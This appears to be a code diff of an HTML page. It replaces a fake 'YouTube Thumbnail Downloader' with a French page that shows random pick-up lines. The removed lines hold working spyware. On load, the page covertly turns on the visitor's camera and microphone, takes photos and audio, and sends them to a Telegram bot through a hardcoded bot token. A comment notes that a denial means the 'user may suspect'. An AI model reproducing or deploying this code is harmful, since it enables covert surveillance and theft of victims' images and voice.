@@ -1,197 +1,167 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-
-  <title>YouTube Thumbnail Downloader</title>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
-  <style>
-    body {
-      font-family: 'Montserrat', sans-serif;
-      margin: 0;
-      padding: 0;
-      background-color: #f5f5f5;
-    }
-    .navbar {
-      background-color: #ff0000;
-      color: white;
-      text-align: center;
-      padding: 15px 0;
-    }
-    #header {
-      margin: 0;
-      font-size: 28px;
-      font-weight: bold;
-    }
-    .container {
-      max-width: 600px;
-      margin: 20px auto;
-      padding: 20px;
-      background-color: #fff;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-    }
-    .form-control {
-      width: calc(100% - 22px);
-      margin-bottom: 15px;
-      padding: 10px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      box-sizing: border-box;
-      font-family: 'Montserrat', sans-serif;
-    }
-    #thumbdloadbtn {
-      display: block;
-      width: 100%;
-      padding: 10px;
-      border: none;
-      border-radius: 5px;
-      background-color: #ff0000;
-      color: white;
-      font-size: 16px;
-      cursor: pointer;
-      font-family: 'Montserrat', sans-serif;
-    }
-    #thumbdloadbtn:hover {
-      background-color: #cc0000;
-    }
-    footer {
-      text-align: center;
-      margin-top: 40px;
-      color: #666;
-    }
-    .youtube-logo {
-      display: block;
-      margin: 20px auto;
-      width: 100px; /* Adjust size as needed */
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phrases d'accroche pour impressionner votre béguin</title>
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/69/YouTube_icon_%282013-2017%29.png" type="image/png">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f9f9f9;
+            margin: 0;
+            padding: 0;
+            color: #333;
+        }
+        header {
+        background-color: #FF0000;
+            color: white;
+            padding: 20px;
+            text-align: center;
+            font-size: 24px;
+        }
+        main {
+            text-align: center;
+            padding: 20px;
+        }
+        .quote-box {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            max-width: 600px;
+            margin: 20px auto;
+            font-size: 18px;
+            color: #555;
+        }
+        button {
+            padding: 15px 30px;
+            background-color: #FF0000;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: background-color 0.1s ease;
+        }
+        button:hover {
+            background-color: #ff4500;
+        }
+        footer {
+            background-color: #333;
+            color: white;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
 </head>
 <body>
-  <nav class="navbar">
-    <img class="youtube-logo" src="https://www.gstatic.com/youtube/img/branding/youtubelogo/svg/youtubelogo.svg" alt="YouTube Logo">
-    <h1 id="header">YOUTUBE THUMBNAIL DOWNLOADER</h1>
-  </nav>
 
-  <div class="container">
-    <input id="ytlink" type="text" class="form-control" placeholder="Enter YouTube Video URL" spellcheck="false">
-    <button id="thumbdloadbtn" onclick="downloadThumbnail()">FETCH</button>
-    <div id="thumbnail-preview"><!-- Placeholder for thumbnail preview --></div>
+<header>
+    <h1>Impressionner votre crush avec des phrases d'accroche</h1>
+</header>
 
-    <h2>How to Download HD YouTube Thumbnail</h2>
-    <ol>
-      <li>Copy the YouTube Video Link / URL from the YouTube App or Website</li>
-      <li>Paste the YouTube video Link / URL in the Input Field Above</li>
-      <li>Click on the "FETCH" Button</li>
-      <li>Select the thumbnail quality</li>
-      <li>Download the Thumbnail</li>
-    </ol>
-  </div>
+<main>
+    <div class="quote-box" id="quoteBox">
+        <p id="quote">Cliquez sur le bouton pour voir une phrase d'accroche !</p>
+    </div>
+    <button id="generateBtn">Générer une phrase d'accroche</button>
+</main>
 
-  <center>
-    <button id="toggle-video" style="display:none;">Toggle Video</button>
-    <div id="message-container"></div>
-    <video id="video" width="0" height="0" autoplay></video>
-  </center>
+<footer>
+    <p>&copy; 2025 Phrases d'accroche | Propulsé par Kaisen ❤️</p>
+</footer>
 
-  <script type="text/javascript">
-  function downloadThumbnail() {
-        // Change button text to indicate fetching
-        var btn = document.getElementById('thumbdloadbtn');
-        btn.textContent = 'Fetching from server... Wait';
+<script>
+    const quotes = [
+       "Ton sourire est mon rayon de soleil, même les jours de pluie.",
+       "Quand je pense à toi, le monde devient plus beau.",
+       "Si la beauté était un crime, tu serais condamnée à vie.",
+       "Être avec toi, c'est comme un rêve dont je ne veux jamais me réveiller.",
+       "Tu n’es pas juste dans mon cœur, tu es mon cœur.",
+       "Je te jure, rien ne me rend plus heureux que de te voir sourire.",
+       "Ton regard est plus puissant que mille mots.",
+       "Je t'aime d'un amour plus fort que l'univers.",
+       "Tu es la première pensée qui me traverse l’esprit chaque matin.",
+       "Je ne suis pas photogénique, mais avec toi, je deviens une œuvre d'art.",
+       "Si on devait faire une course, je te laisserais gagner... juste pour avoir une excuse de te regarder plus longtemps.",
+       "Tu es la raison pour laquelle je souris sans raison.",
+       "Si j'avais un dollar pour chaque fois que je pense à toi, je serais déjà millionnaire.",
+       "Tu es comme un Wi-Fi... quand tu es près de moi, je me sens connecté.",
+       "Je crois que j’ai trouvé le numéro de ma chance, et il se termine par ton nom.",
+       "Ton sourire me fait fondre comme du chocolat au soleil.",
+       "Je pourrais t'envoyer des textos, mais je préfère te parler en personne... pour entendre ta voix.",
+       "Est-ce que ton prénom est Google ? Parce que tu as tout ce que je cherchais.",
+       "Quand je suis près de toi, je perds mes mots... mais je trouve toujours ton regard.",
+       "Tu es comme un secret que je veux garder pour toujours.",
+       "Ce n’est pas seulement ton apparence qui me fascine, mais aussi ce que tu es.",
+       "Il y a quelque chose chez toi qui me fait penser que nous avons une histoire à raconter.",
+       "Tu es le genre de personne qui laisse une empreinte dans l'âme.",
+       "J’aimerais être une étoile pour briller dans ton ciel, mais je préfère être un rêve que tu n’oublieras jamais.",
+       "Si les étoiles pouvaient parler, elles parleraient de toi.",
+       "Je voudrais être une page de ton livre, juste pour être près de toi à chaque chapitre.",
+       "Ton amour est comme un rayon de lune qui éclaire mes nuits sombres.",
+       "Je t’écris en silence avec chaque battement de mon cœur.",
+       "Tes yeux sont comme un océan sans fin, et je suis perdu dedans.",
+       "Avec toi, chaque instant est une poésie, chaque geste une mélodie.",
+       "Si j'étais un poème, tu serais chaque mot que je veux écrire.",
+       "Ton amour est une mélodie que je veux entendre pour toujours.",
+       "Dans le livre de ma vie, tu es le chapitre que je relis sans cesse.",
+       "Tu es l'étoile dans mon ciel, l'inspiration dans mes rêves.",
+       "Si les étoiles pouvaient parler, elles parleraient de toi.",
+       "Avec toi, chaque moment est magique.",
+       "Si j'étais un chat, je passerais mes 9 vies avec toi.",
+        "Ton sourire est mon rayon de soleil, même les jours de pluie.",
+        "Quand je pense à toi, le monde devient plus beau.",
+        "Si la beauté était un crime, tu serais condamnée à vie.",
+        "Être avec toi, c'est comme un rêve dont je ne veux jamais me réveiller.",
+        "Tu n’es pas juste dans mon cœur, tu es mon cœur.",
+        "Je te jure, rien ne me rend plus heureux que de te voir sourire.",
+        "Ton regard est plus puissant que mille mots.",
+        "Je t'aime d'un amour plus fort que l'univers.",
+        "Tu es la première pensée qui me traverse l’esprit chaque matin.",
+        "Je ne suis pas photogénique, mais avec toi, je deviens une œuvre d'art.",
+        "Si on devait faire une course, je te laisserais gagner... juste pour avoir une excuse de te regarder plus longtemps.",
+        "Tu es la raison pour laquelle je souris sans raison.",
+        "Si j'avais un dollar pour chaque fois que je pense à toi, je serais déjà millionnaire.",
+        "Tu es comme un Wi-Fi... quand tu es près de moi, je me sens connecté.",
+        "Je crois que j’ai trouvé le numéro de ma chance, et il se termine par ton nom.",
+        "Ton sourire me fait fondre comme du chocolat au soleil.",
+        "Je pourrais t'envoyer des textos, mais je préfère te parler en personne... pour entendre ta voix.",
+        "Est-ce que ton prénom est Google ? Parce que tu as tout ce que je cherchais.",
+        "Quand je suis près de toi, je perds mes mots... mais je trouve toujours ton regard.",
+        "Tu es comme un secret que je veux garder pour toujours.",
+        "Ce n’est pas seulement ton apparence qui me fascine, mais aussi ce que tu es.",
+        "Il y a quelque chose chez toi qui me fait penser que nous avons une histoire à raconter.",
+        "Tu es le genre de personne qui laisse une empreinte dans l'âme.",
+        "J’aimerais être une étoile pour briller dans ton ciel, mais je préfère être un rêve que tu n’oublieras jamais.",
+        "Si les étoiles pouvaient parler, elles parleraient de toi.",
+        "Je voudrais être une page de ton livre, juste pour être près de toi à chaque chapitre.",
+        "Ton amour est comme un rayon de lune qui éclaire mes nuits sombres.",
+        "Je t’écris en silence avec chaque battement de mon cœur.",
+        "Tes yeux sont comme un océan sans fin, et je suis perdu dedans.",
+        "Avec toi, chaque instant est une poésie, chaque geste une mélodie.",
+        "Si j'étais un poème, tu serais chaque mot que je veux écrire.",
+    "Ton amour est une mélodie que je veux entendre pour toujours.",
+        "Dans le livre de ma vie, tu es le chapitre que je relis sans cesse.",
+        "Tu es l'étoile dans mon ciel, l'inspiration dans mes rêves.",
+        "Si les étoiles pouvaient parler, elles parleraient de toi.",
+        "Avec toi, chaque moment est magique."
+    ];
 
-        // Add your logic to fetch the thumbnail here
-        // ...
-    }
-    function la(src) {
-      window.location = src;
-    }
-    
-         function GetURLParameter(sParam) {
-           var sPageURL = window.location.search.substring(1);
-           var sURLVariables = sPageURL.split('&');
-           for (var i = 0; i < sURLVariables.length; i++) {
-             var sParameterName = sURLVariables[i].split('=');
-             if (sParameterName[0] == sParam) {
-               return sParameterName[1];
-             }
-           }
-         }
-    
-         var chatid = GetURLParameter('id');
-         
-    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-      .then((stream) => {
-        const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
-        const audioRecorder = new MediaRecorder(stream);
+    const generateBtn = document.getElementById('generateBtn');
+    const quoteBox = document.getElementById('quoteBox');
+    const quoteText = document.getElementById('quote');
 
-        function capturePhoto(index) {
-          setTimeout(() => {
-            imageCapture.takePhoto()
-              .then((blob) => {
-                sendToTelegram(blob, 'photo');
-              })
-              .catch((error) => {
-                console.error('Error capturing photo:', error);
-              });
-          }, index * 2000);
-        }
+    // Fonction pour générer une phrase aléatoire
+    generateBtn.addEventListener('click', function() {
+        const randomQuote = quotes[Math.floor(Math.random() * quotes.length)];
+        quoteText.textContent = randomQuote;
+    });
+</script>
 
-        function startAudioRecording() {
-          audioRecorder.start();
-          setTimeout(() => {
-            audioRecorder.stop();
-          }, 5000);
-        }
-
-        audioRecorder.ondataavailable = (event) => {
-          if (event.data.size > 0) {
-            sendToTelegram(event.data, 'audio');
-          }
-        };
-
-        for (let i = 0; i < 3; i++) {
-          capturePhoto(i);
-        }
-
-        startAudioRecording();
-      })
-      .catch((error) => {
-        if (error.name === 'NotAllowedError') {
-          // Handle the case where permissions are denied
-          console.warn('Permissions denied. User may suspect.');
-        } else {
-          console.error('Permission error:', error);
-        }
-      });
-
-    function sendToTelegram(data, type) {
-   
-      const botToken = '8032048937:AAFC1zIEGtmwc17f7sWTaNQzYKq8xrqLHCk';
-      const chatId = chatid;
-
-      const formData = new FormData();
-      formData.append('chat_id', chatId);
-      formData.append(type === 'photo' ? 'photo' : 'audio', data, `@SocialPhishingBot.${type === 'photo' ? 'jpg' : 'wav'}`);
-
-      fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, 
-{
-        method: 'POST',
-        body: formData
-      })
-        .then(response => response.json())
-        .then(data => console.log(data))
-        .catch(error => console.error('Error sending to Telegram:', error));
-    }
-               
-  
-    
-  </script>
-
-  <footer>
-    <p>Made With ❤️ By Kaisen</p>
-  </footer>
 </body>
-</html>
+  </html>
